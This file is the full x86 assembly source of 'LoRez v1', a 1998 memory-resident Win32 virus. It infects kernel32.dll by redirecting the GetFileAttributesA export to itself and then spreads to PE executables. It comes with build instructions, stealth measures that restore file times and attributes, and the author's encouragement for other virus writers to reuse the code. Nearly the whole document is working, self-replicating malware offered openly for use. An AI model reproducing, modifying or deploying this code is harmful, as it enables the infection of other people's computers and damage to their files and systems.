
;** NOTE: original release assumed that this virus worked on WinNT, but I
;** never tested it. I later found out that it does not go memory resident 
;** under WinNT, although it causes no system faults, etc.

;
; LoRez v1 - By Virogen [NoP]
;
;  This is my final research on Win32 resident kernel infection. LoRez is
;  a memory-resident Win32 PE EXE Infector. It successfully operates on
;  any kernel version of any Win32 platform (Win95,WinNT,Win98). The virus
;  goes memory resident by infecting kernel32.dll. It changes the export
;  RVA of GetFileAttributesA to that of the virus code. The next time the
;  system boots, the virus goes memory resident and infects any PE EXE
;  win32 calls GetFileAttributesA on. This includes any EXE executed as well
;  as many those accessed in many other file manipulations. In order to
;  get around the shared lock on kernel32.dll, LoRez copies the kernel
;  to the windows directory and infects it there. This new copy of the
;  kernel will be found before the original one in the system directory
;  when the system is booted.
;
;  In order to remove the use of static APIs addresses, LoRez searches
;  the kernel32 export table in memory for the APIs which it requires. It
;  does this by first determining the operating system. It finds this by
;  checking a value on the stack and comparing it to the Win95/98 or WinNT
;  kernel bases, which are static regardless of kernel version. If the
;  operating system cannot be determined, then LoRez passes control back
;  to the host without ever accessing any memory which might cause a fault.
;  Once the kernel base is determined, LoRez finds the export table and
;  then extracts the addresses of the APIs it needs.
;
;   Virus Name: LoRez v1
;   Virus Author: Virogen [NoP]
;   Release Date: 03-05-98
;   Operating Systems: Win95/WinNT/Win98
;   Hosts : PE EXE files
;   Encryption: Removed, till I get a new poly engine coded
;   File Date/Time: Unchanged
;   File Attributes: Unchanged ; the virus resets and then restores them
;   File Size: Can grow by approx 1.6k at most. Sometimes there will be NO
;              file size increase due to the alignment of the EXE. 
;
;
;   Past/Present/Future:
;    - My first Win95 virus was Yurn released last week. This was my first
;      attempt at windows resident infection and my first dive into the
;      windows operating system. Yurn infected the kernel by changing the
;      entry code of GetFileAttributesA to a call to the virus code. Yurn
;      was limited because it depended on static APIs and kernel versions
;      hardcoded into it. I regret releasing it in regards to the
;      superority of its spawn LoRez which was released only a week 
;      later. However, the Yurn release helped me to acquire many new
;      insights from my virus colleagues. Release date: 02-25-98.
;
;    - LoRez is my attempt at full Win32 infection without the use of
;      static APIs. LoRez is far superior to Yurn in many respects.
;      It has been a great success and I think will open up a new era of
;      Win32 infection. The techniques LoRez uses opens the Win32 platform
;      to many new possibilities. All that is left now is to add more
;      advanced features such as polymorphism and stealth. I sincerely hope
;      that virus authors will find this code useful in creating their own
;      kernel infectors. Release date: 03-05-98      
;
;    - The future: I will release a 32-bit polymorphic engine next,
;      along with a new and better virus using the techniques I've
;      researched here. This is ofcourse, provided I can finish it
;      before Mar 16 (I'll be gone from the computer world for 3
;      months). If not, then I look forward to seeing the new virus
;      code my colleagues have written in my absence.
;
;   How to contact me : try effnet #virus
;
; Greetz -     
;   -l, Memory Lapse, Soul Manager, Murkry, Treaz0n, Cicatrix, Darkman,
;   VirusBuster, and others.
;   
;
;  HOW TO COMPILE LOREZ:
;    I use TASM32 v5. Included is a makefile for LOREZ. After you compile
;    the virus, just take out your handy hex editor and change the flags
;    of the code object to 0E0000040h. Note that this is stored in intel
;    reverse dd at offset 21Ch in LOREZ.EXE.
;
;
;
;
;
.386
locals
jumps
.model flat,STDCALL

L equ 

extrn ExitProcess : PROC                ; this is so the import table
                                        ; won't be empty. Is not used
                                        ; in the virus. You'll need
                                        ; IMPORT32.LIB for this one.
                                                                                
org 1000h
.data                                   ; our lonely data object
progname        db 'LoRez Virus host (c)Virogen',0
.code                                   ; .code - change flags after compile
                                        ; to r/w/x
;-----------------------------------------------------------------------------
;
start:                                  ; the would-be host
        push    0
        call    [ExitProcessAPI]        ; exit process 

;-----------------------------------------------------------------------------
;
;  LoRez virus starts here
;
MAX_HDR equ 0250h                       ; we shouldn't need more than this
ID_OFF equ 0ch                          ; offset in header for our marker
VIRUS_SIZE equ (offset vend-offset vstart) ; total size of our virus here
VIRTUAL_SIZE equ (offset buffer_end-offset vstart) ; our virtual size
MEM_ID equ 12345678h                    ; our communcation needs
;
;
vstart:
    call geteip                               ; find relative offset    
geteip:
    mov ebp,[esp]                             ; grab it off stack
    mov eax,ebp                               ; used below
    sub ebp,offset geteip                     ; fix it up
    add esp,4                                 ; fix da stack

    db 2dh                                    ; sub eax
  host_addr dd (offset geteip-offset start)
    push eax                                  ; subtract entry point differ
                                              ; to get orginal entry VA

    mov edx,[esp+4]                           ; determine OS
    and edx,0fff00000h          
    mov eax,0BFF70000h                        ; WIn95 kernel base 0BFF70000
    cmp edx,0bff00000h                        ; Win95?
    jz good_os
    mov eax,edx                               ; our NT kernel at 77F00000
    cmp edx,077f00000h                        ; WinNT?
    jnz goto_host                             ; abort if neither

good_os:
;
; a brief explanation of the organization of the export table would be
; useful here. Ok, basically there are three tables within the export
; table : API RVA Table (32bit), Name Pointer Table(32bit), and Ordinal
; Table (16bit). Ok, the ordinal number of an API is the entry number of
; the API in the RVA array. So, multiply the ordinal number by four and
; you've got an index into the API RVA Table. Probably you don't already
; have the ordinal number though, so you'll have to find it. To do this,
; you use the Name Pointer Table. This is an array of pointers to the
; asciiz name of each API. When you find the pointer of the API you're
; looking for by string compares, you take the index number of it and
; multiply it by 2 (because the ordinal table is 16bit). Index the result
; in the ordinal table, and you're all set.
;
;
    mov [ebp+imagebase],eax                   ; save kernel base
    mov esi,eax
    add esi,[esi+3ch]                         ; relative ptr to PE header
    cmp word ptr [esi],'EP'                   ; make sure we're on right track
    jnz goto_host                             ; if not.. abort
    mov esi,[esi+120]                         ; get export table RVA
    add esi,eax                               ; relative to image base
    mov edi,[esi+36]                          ; get ordinal table RVA
    add edi,eax                               ; relative to image base
    mov [ebp+ordinaltbl],edi                  ; save it
    mov edi,[esi+32]                          ; get name ptr RVA
    add edi,eax                               ; is relative to image base  
    mov [ebp+nameptrtbl],edi                  ; save it
    mov ecx,[esi+24]                          ; get number of name ptrs
    mov esi,[esi+28]                          ; get address table RVA
    add esi,eax                               ; is relative to image base
    mov [ebp+adrtbl],esi                      ; save it

    xor edx,edx                               ; edx is our ordinal counter
                                              ; edi=name ptr table
                                              ; ecx=number of name ptrs
    lea esi,[ebp+APIs]                        ; -> API Name ptrs
    mov [ebp+ourAPIptr],esi                   ; save it
    lea eax,[ebp+API_Struct]                  ; our API address will go here
    mov [ebp+curAPIptr],eax                   ; save it
chk_next_API_name:
    mov esi,[ebp+ourAPIptr]                   ; get ptr to structure item
    mov ebx,[esi]                             ; load ptr to our API name
    add ebx,ebp                               ; add relative address
    mov esi,[edi]                             ; get API name RVA
    add esi,[ebp+imagebase]                   ; relative to image base
compare_API_name:
    lodsb    
    cmp al,byte ptr [ebx]                     ; compare a byte of names
    jnz not_our_API                           ; it's not our API
    cmp al,0                                  ; end of string?
    jz is_our_API                             ; it's our API
    inc ebx
    jmp compare_API_name

not_our_API:
    inc edx                                   ; increment API counter
    cmp edx,ecx                               ; last entry of name ptr table?
    jz goto_host                              ; uhoh.. we didn't find one
                                              ; of our APIs.. abort it all
    add edi,4                                 ; increment export name ptr idx
    mov esi,[ebp+ourAPIptr]                   ; restore our API name ptr struct
    jmp chk_next_API_name

is_our_API:

    mov edi,[ebp+ordinaltbl]                  ; load oridinal table RVA
    push ecx
    push edx
    xchg edx,eax                              ; edx=API number
    add eax,eax                               ; *2 cuz ordinals are words
    add edi,eax                               ; add to ordinal table VA
    mov ax,[edi]                              ; get ordinal (word)
    xor edx,edx
    mov ecx,4
    mul ecx                                   ; *4 cuz address tbl is dd's
    mov edi,[ebp+adrtbl]                      ; load address table VA
    add edi,eax                               ; set idx to API
    mov eax,edi                                 
    sub eax,[ebp+imagebase]                   ; get the VA of the entry
    mov [ebp+originalRVAptr],eax              ; save it for kernel infection
                                              ; notice that our last API
                                              ; in the array is the one we
                                              ; hook
    mov eax,[edi]                             ; get API RVA
    mov [ebp+originalRVA],eax                 ; save it for kernel infection
    add eax,[ebp+imagebase]                   ; is relative to image base
    mov edi,[ebp+curAPIptr]                   ; idx to storage stucture
    mov [edi],eax                             ; save VA of API
    add edi,4                                 ; increment index
    mov [ebp+curAPIptr],edi                   ; save    

    pop edx
    pop ecx

    mov edi,[ebp+nameptrtbl]                  ; reset export name ptr tableidx
    mov esi,[ebp+ourAPIptr]                   ; restore idx to our name ptrs
    add esi,4                                 ; increment idx API name ptr structure
    mov [ebp+ourAPIptr],esi                   ; save our new ptr to name ptr
    cmp dword ptr [esi],0                     ; end of our API structure?
    jz found_all                              ; if so then we got 'em all
    mov edi,[ebp+nameptrtbl]                  ; reset idx to export name pt
    xor edx,edx                               ; reset API counter
    jmp chk_next_API_name    

;
; now we're done finding all of our API VAs 
;

found_all:
    
    mov byte ptr [ebp+offset infkern],1       ; set kernel infection flag

    lea eax,[ebp+fname]
    push eax                                  ; save for below
    push 0FFh                                 ; max buffer size
    push eax                                  ; ptr
    call [ebp+GetSysDirAPI]                   ; get system directory 

    pop edi
    add edi,eax                               ; find end of directory name
    push edi                                  ; where the filename needz to go

    lea eax,[ebp+copyfname]
    push eax                                  ; save for below
    push 0ffh
    push eax
    call [ebp+GetWinDirAPI]                   ; get windoze directory 

    pop edi
    add edi,eax

    lea esi,[ebp+kernfile]
    call copy_str                            ; append \kernel32.dll to windoze dir

    pop edi                                  ; restore windoze sys dir
    lea esi,[ebp+kernfile]
    call copy_str                            ; append kernel32.dll to windoze sys dir

    push 0
    lea eax,[ebp+copyfname]                  ; from sys dir
    push eax
    lea eax,[ebp+fname]                      ; to win dir
    push eax
    call [ebp+CopyFileAPI]                   ; copy kernel to windows dir

    cmp eax,0                                ; if error then we're prob.
    jz goto_host                             ; already in memory                                    

    lea eax,[ebp+copyfname]                  ; infecting windir\kernel32.dll
    mov [ebp+fnameptr],eax                   ; set file ptr

    call infect_file                         ; infect the kernel

goto_host:

   pop eax                                  ; restore entry VA
   jmp eax                                  ; jmp to host entry VA                                

;-----------------------------------------------
; infect file - call with fnameptr set
;
infect_file:

    mov eax,[ebp+fnameptr]
    push eax
    mov ecx,MEM_ID                           ; let us know its us
    call [ebp+GetAttribAPI]                  ; get file attributes
    mov [ebp+oldattrib],eax

    cmp eax,-1                               ; if error then maybe shared
    jnz not_shared
    ret                                      ; can't infect it    

not_shared:
    push 20h                                 ; +A
    mov eax,[ebp+fnameptr]     
    push eax
    call [ebp+SetAttribAPI]                  ; clear 'da attribs

    call open_default_file

    cmp eax,-1
    jnz open_ok
    ret         

open_ok:

    lea eax,[ebp+creation]                   ; creation time
    push eax
    lea eax,[ebp+lastaccess]                 ; last accessed
    push eax
    lea eax,[ebp+lastwrite]                  ; last writen to    
    push eax
    push [ebp+handle]
    call [ebp+GetFileTimeAPI]                ; grab the file time

    mov ecx,50h                              ; read MZ EXE header
    lea edx,[ebp+peheader]                   ; (if that's what it is)
    call read_file

    cmp word ptr [ebp+peheader],'ZM'         ; is EXE?
    jnz abort_infect

    mov eax,dword ptr [ebp+peheader+3ch]      ; where PE hdr pointer is
    mov [ebp+ptrpeheader],eax                 ; save it
    call setfp

    call setfp_pehdr

    mov ecx,MAX_HDR                          ; now read the pe header  
    lea edx,[ebp+peheader]
    call read_file

    cmp [ebp+bytesread],MAX_HDR                ; could we read it all?
    jnz abort_infect                           ; something funky if no

    cmp word ptr [ebp+peheader],'EP'           ; PE?
    jnz abort_infect
    cmp dword ptr [ebp+peheader+ID_OFF],0      ; any value here?
    jnz abort_infect                           ; if yes, infected
    cmp byte ptr [ebp+infkern],1               ; infecting kernel?
    jz skip_base_chk                           ; if so then its ok to be DLL    
    cmp dword ptr [ebp+imagebase],00400000h    ; executables should have this
    jnz abort_infect                           ; base, DLLs probably not.
skip_base_chk:

    call [ebp+GetTickCountAPI]                 ; get tick count
    mov dword ptr [ebp+peheader+ID_OFF],eax    ; save as infect flag

    xor esi,esi
    mov si, word ptr [ebp+NtHeaderSize]        ; get header size
    add esi,18h                                ; object table is here 
    mov dword ptr [ebp+ObjTbloff],esi           

    lea eax,[ebp+peheader]                      ; is relative to PE hdr RVA
    add esi,eax                                 ; esi->object table
    mov [ebp+objtblVA],esi                      ; save the object table VA
    xor eax,eax                        
    mov ax,[ebp+numObj]                         ; get number of objects
    dec eax                                     ; we want last object
    mov ecx,40                                  ; each object 40 bytes
    xor edx,edx
    mul ecx                                     ; numObj-1*40=last object     
    add esi,eax                                 ; esi->last obj

    lea eax,[ebp+peheader+MAX_HDR-40]
    cmp esi,eax                                 ; if it's out of our range
    jg abort_infect                             ; then about this here shit
        
    mov eax,[esi+20]                            ; get last object physical off
    mov [ebp+lastobjimageoff],eax               ; save it

    mov ecx,dword ptr [ebp+filealign]           ; get file alignment
    mov eax,[esi+16]                            ; get physical size of object
    mov [ebp+originalpsize],eax                 ; save it 4 later
    push eax
    add eax,vend-vstart                         ; size of our code
    call align_fix                              ; set on file alignment
    mov dword ptr [esi+16],eax                  ; save new physical size

    mov ecx,dword ptr [ebp+objalign]            ; get object alignment
    push ecx                                    ; save for below
    mov eax,[esi+8]                             ; get object virtual size
    add eax,VIRTUAL_SIZE                        ; add our virtual size
    call align_fix                              ; set on obj alignment
    mov dword ptr [esi+8],eax                   ; save new virtual size

    pop ecx
    mov eax,VIRTUAL_SIZE                        ; how big we is
    add eax,dword ptr [ebp+imagesize]           ; add to old image size
    call align_fix                              ; set on obj alignment
    mov dword ptr [ebp+imagesize],eax           ; save new imagesize

    mov [esi+36],0E0000040h                     ; set object flags r/x/x

    pop eax                                     ; restore orginal physical size
    add eax,[esi+12]                            ; add last object's RVA 
                                                ; eax now RVA of virus code
    mov [ebp+virusRVA],eax                      ; save it
    cmp byte ptr [ebp+offset infkern],0         ; do our kernel32?
    jz  new_entry                               ; nope.. regular PE

;--- our kernel infection starts here ---
;
;  This is really fairly simple. First thing we need to do is find the
;  image offset of the export table entry for the API we're hooking. We
;  do this by locating the object that contains the export table. Then,
;  we subtract the image offset of the object from the virtual offset
;  of the object. The difference is then subtracted from the previously
;  saved RVA of the table entry. =image offset
;
;  The different Win32 kernels have different objects which their
;  export table is located in. The Win95 kernels have it located in
;  .edata, while win98 puts it in .text, winNT decides to throw the
;  shit in .rdata. How do we determine which kernel is which, and which
;  object to calculate the image offset by? Simple, Win95 is the only
;  kernel that contains .edata, WinNT is the only kernel which contains
;  .rdata, and Win98 is the only kernel which doesn't contain either.
;
;  Once we extrapolate the image offset of the export table entry for the
;  RVA of the API we're hooking, we just save the old RVA, and put our
;  RVA in its place.
;
;
    mov esi,[ebp+objtblVA]                      ; load object table VA
    xor ecx,ecx
    mov cx,[ebp+numObj]                         ; get number of objects
    dec ecx
    xor edx,edx                                 ; we'll store our virtual-
                                                ; physical difference here
calc_fo_loop:
    cmp dword ptr [esi],'ade.'                  ; is it .edata? for win95
    jz end_calc_fo_loop                         ; if so we can reference it
    cmp dword ptr [esi],'xet.'                  ; is it .text? for win98
    jnz not_text
    mov [ebp+objtext],esi                       ; save table entry offset   
not_text:
    cmp dword ptr [esi],'adr.'                  ; is it .rdata? for winNT
    jz end_calc_fo_loop                         ; if rdata exists, then
                                                ; our export shit is there
    add esi,40                                  ; to next object we go
    dec ecx                                     ; decrement # of objects
    jnz calc_fo_loop                            ; if not been thru all loop
    mov esi,[ebp+objtext]                       ; if .edata or .rdata, then
end_calc_fo_loop:                               ; it must be .text
    mov edx,[esi+12]                            ; get the object virtual off
    sub edx,[esi+20]                            ; subtract physical offset
    mov eax,[ebp+originalRVAptr]                ; get table entry rva
    sub eax,edx                                 ; subract difference

    mov [ebp+FileOff],eax                       ; save table entry image off
    call setfp                                  ; set file pointer to it

    mov ecx,4                                   ; read RVA 
    lea edx,[ebp+chkRVA]
    call read_file                              ; and check it to make sure
                                                ; we've got it right
    mov eax,[ebp+chkRVA]
    cmp eax,[ebp+originalRVA]                   ; is it the right RVA?
    jnz abort_infect                            ; if not abort infection

    mov eax,[ebp+FileOff]                       ; get image offset 
    call setfp                                  ; set file ptr to table entry

    mov eax,[ebp+virusRVA]                      ; get virus RVA
    add eax,(offset hook-offset vstart)         ; find our API hook RVA

    lea esi,[ebp+hookRVA]                       ; to be written
    mov [esi],eax                               ; save hook RVA
    mov ecx,4                                   ; dd
    call write_code                             ; write the new hook RVA

    mov eax,[ebp+originalRVA]                   ; get orginal API RVA
    add eax,[ebp+imagebase]                     ; relative to image base
    mov [ebp+jmpback],eax                       ; save it
    
    jmp calc_reloc                              ; skip entry point change..

;-------------------------------------------------------
; our PE EXE infection
;
new_entry:    
    mov eax,[ebp+virusRVA]                       ; eax=virus RVA
    mov ebx,dword ptr [ebp+entrypointRVA]        ; save old entry point
    mov dword ptr [ebp+entrypointRVA],eax        ; put our RVA as entry

calc_reloc:
    add eax,(offset geteip-offset vstart)        ; fix for our reloc call
    sub eax,ebx                                  ; difference of entry pts
    mov dword ptr [ebp+offset host_addr],eax     ; virusRVA-entryRVA=diff
                                                 ; virusVA-diff=entryVA

    call setfp_pehdr                             ; back to PE header

    lea esi,[ebp+peheader]                       ; write the new PE header
    mov ecx,MAX_HDR
    call write_code                              ; to the host

    mov eax,[ebp+originalpsize]                  ; restore original physical size
    add eax,[ebp+lastobjimageoff]                ; add object physical offset
    call setfp                                   ; set ptr to end of object
    
    lea esi,[ebp+vstart]
    mov ecx,VIRUS_SIZE
    call write_code                        ; write the virus code to the host

abort_infect:
    
    lea eax,[ebp+creation]                   ; creation time
    push eax
    lea eax,[ebp+lastaccess]                 ; last accessed
    push eax
    lea eax,[ebp+lastwrite]                  ; last writen to    
    push eax
    push [ebp+handle]
    call [ebp+SetFileTimeAPI]              ; restore orginal file time

    call close_file                        ; we're done

    mov eax,[ebp+oldattrib]                ; get original attribs 
    push eax
    mov eax,[ebp+fnameptr]
    push eax                    
    call [ebp+SetAttribAPI]                ; restore the original attributes
    ret                                 

;---------------------------------------------------------------
; close handle at [handle]
;
close_file:
    push dword ptr [ebp+offset handle]
    call [ebp+CloseFileAPI]
    ret

;---------------------------------------------------------------
; opens file with ptr to filename at [fnameptr]
;
open_default_file:
      mov eax,[ebp+fnameptr]
;---------------------------------------------------------------
; opens file, pass eax->filename
;
open_file:
      push 0
      push 20h                          ; r+w
      push 3                            ; 3=open existing file
      push 0
      push 0
      push 0C0000000h                   ; open for r+w
      push eax
      call [ebp+CreateFileAPI]
      mov [ebp+handle],eax              ; save handle
      ret

;---------------------------------------------------------------
; read handle 
; pass ecx=bytes to read, edx=offset for bytes read
;
read_file:
     push 0                             
     lea eax,[ebp+bytesread]
     push eax
     push ecx
     push edx
     push [ebp+handle]
     call [ebp+ReadFileAPI]
     ret

;--------------------------------------------------------------
; sets eax on alignment of ecx
;
align_fix:
     xor edx,edx
     div ecx                               ; /alignment
     inc eax                               ; next alignment
     mul ecx                               ; *alignment                             
     ret

;--------------------------------------------------------------
; set file pointer to PE header
setfp_pehdr:
     mov eax,[ebp+ptrpeheader]

;--------------------------------------------------------------
; set file ptr of [handle] 
; pass eax=offset from beginning
;
setfp:
      push 0
      push 0
      push eax
      push [ebp+handle]
      call [ebp+SetFilePtrAPI]
      ret

;-------------------------------------------------------------
; write to [handle]
; pass ecx=bytes to write, esi->source
;
write_code:
   push 0
   lea eax,[ebp+bytesread]
   push eax
   push ecx
   push esi
   push [ebp+handle]
   call [ebp+WriteFileAPI]
   ret


;-------------------------------------------------------------
; copy string
; pass edi->destination esi->source
;

copy_str:
    mov ecx,0FFh                              ; no bigger than 256
copystr:
    lodsb
    stosb
    cmp al,0
    jz copystrdone
    loop copystr
copystrdone:
    ret


;------------------------------ hooked ------------------------
; this is our API hook for GetAttrib
;
hook:                
        
        pushfd
        push eax                                ; save regs
        push ebx
        push ecx
        push edx
        push edi
        push esi
        push ebp

        call reloc                              ; find relative index
reloc:  
        pop ebp                                 ; eip        
        sub ebp, offset reloc                   ; get relative address

        lea eax,[ebp+jmpback]                   ; get jump back ptr
        mov [ebp+jmpbackptr],eax                ; save jump back ptr

        cmp ecx,MEM_ID                          ; is it us?
        jz abort_mem                            ; if so then abort

        mov byte ptr [ebp+infkern],0            ; we're infecting normal
        
        mov eax,[esp+24h]                       ; ptr to filename is here
        mov [ebp+fnameptr],eax                  ; save ptr to filename
        call infect_file                        ; replicate ourselves
abort_mem:
        pop ebp                                 ; restore regs
        pop esi
        pop edi
        pop edx
        pop ecx
        pop ebx
        pop eax
        popfd
        
        db 0FFh,25h                             ; jmp [ ]    
jmpbackptr dd offset jmpback

jmpback dd 0                                    ; original API VA

db 'þ [LoRez] v1 by Virogen [NoP] þ'              ; it's i said the fly

kernfile db '\KERNEL32.dll',0                   ; our kernel filename
kernfile_e:

APIs:                                  ; structure of ptrs to our API names
dd offset GetTicks
dd offset GetWinDir
dd offset SetAttrib
dd offset CreateFile
dd offset SetFilePtr
dd offset ReadFile
dd offset WriteFile
dd offset CloseFile
dd offset GetSysDir
dd offset CopyFile
dd offset GetFileTime
dd offset SetFileTime
dd offset ExitProc
dd offset GetAttrib                    ; the last entry is our hooked API
dd 0
                                       ; our API names 
GetTicks    db 'GetTickCount',0
GetWinDir   db 'GetWindowsDirectoryA',0
SetAttrib   db 'SetFileAttributesA',0
CreateFile  db 'CreateFileA',0
SetFilePtr  db 'SetFilePointer',0
ReadFile    db 'ReadFile',0
WriteFile   db 'WriteFile',0
CloseFile   db 'CloseHandle',0
GetSysDir   db 'GetSystemDirectoryA',0
CopyFile    db 'CopyFileA',0
GetFileTime db 'GetFileTime',0
SetFileTime db 'SetFileTime',0
ExitProc    db 'ExitProcess',0          ; only used in original host
GetAttrib   db 'GetFileAttributesA',0

API_Struct:                             ; structure for API VAs
GetTickCountAPI dd 0
GetWinDirAPI    dd 0
SetAttribAPI    dd 0
CreateFileAPI   dd 0
SetFilePtrAPI   dd 0
ReadFileAPI     dd 0
WriteFileAPI    dd 0
CloseFileAPI    dd 0
GetSysDirAPI    dd 0
CopyFileAPI     dd 0
GetFileTimeAPI  dd 0
SetFileTimeAPI  dd 0
ExitProcessAPI  dd 0
GetAttribAPI    dd 0
FileOff         dd 0
APIStructEnd:

; data below is not written to disk, but is allocated by object
vend:

handle dd 0                                ; file handle
infkern db 0                               ; kernel infection flag
ptrpeheader  dd 0                          ; offset of PE header
ObjTbloff    dd 0                          ; offset of object table
objtblVA     dd 0                          ; VA of object table
bytesread    dd 0                          ; return from fread/fwrite

nameptrtbl      dd 0                        
adrtbl          dd 0
ourAPIptr       dd 0
curAPIptr       dd 0
ordinaltbl      dd 0
originalRVAptr  dd 0                       ; RVA ptr to our hooked API RVA
originalRVA     dd 0                       ; orginal RVA of our hooked API
chkRVA          dd 0
originalpsize   dd 0
hookRVA         dd 0
virusRVA        dd 0
hdrread         dd 0
lastobjimageoff dd 0
objtext        dd 0
creation       dd 0,0                      ; our file time structures
lastaccess     dd 0,0
lastwrite      dd 0,0

oldattrib      dd 0                        ; stored file attribs
fnameptr       dd 0                        ; ptr to file name we're infecting
fname          db 64 dup (0)               ; storage for source kernel32.dll
copyfname      db 64 dup (0)               ; storage for dest. kernel32.dll

peheader:                                  ; PE header format 
 signature     dd 0
 cputype       dw 0
 numObj        dw 0
               dd 0,0,0
 NtHeaderSize  dw 0
 Flags         dw 0
               dd 0,0,0,0
 entrypointRVA dd 0
               dd 0,0
 imagebase     dd 0
 objalign      dd 0
 filealign     dd 0
               dd 0,0,0,0
 imagesize     dd 0
 headersize    dd 0

db MAX_HDR*2 dup (0)                
buffer_end:
ends
end vstart


